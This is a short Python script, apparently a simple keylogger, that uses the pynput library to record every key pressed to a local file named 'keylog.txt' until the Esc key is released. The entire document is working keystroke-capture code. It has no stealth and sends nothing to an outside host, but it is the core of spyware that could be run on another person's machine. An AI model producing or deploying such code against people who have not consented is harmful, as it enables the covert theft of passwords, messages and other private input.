import pynput
from pynput.keyboard import Key, Listener

log_file = "keylog.txt"

def on_press(key):
    """Logs the key pressed to a file."""
    try:
        with open(log_file, "a") as f:
            f.write(f'{key.char}')
    except AttributeError:
        # Handles special keys like 'shift', 'ctrl', etc.
        with open(log_file, "a") as f:
            if key == Key.space:
                f.write(' ')
            else:
                f.write(f' {key} ')

def on_release(key):
    """Stops the listener when the 'esc' key is released."""
    if key == Key.esc:
        # Stop listener
        return False

# Create a listener object and start it
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print(f"Keylogger stopped. Keystrokes are saved in '{log_file}'")
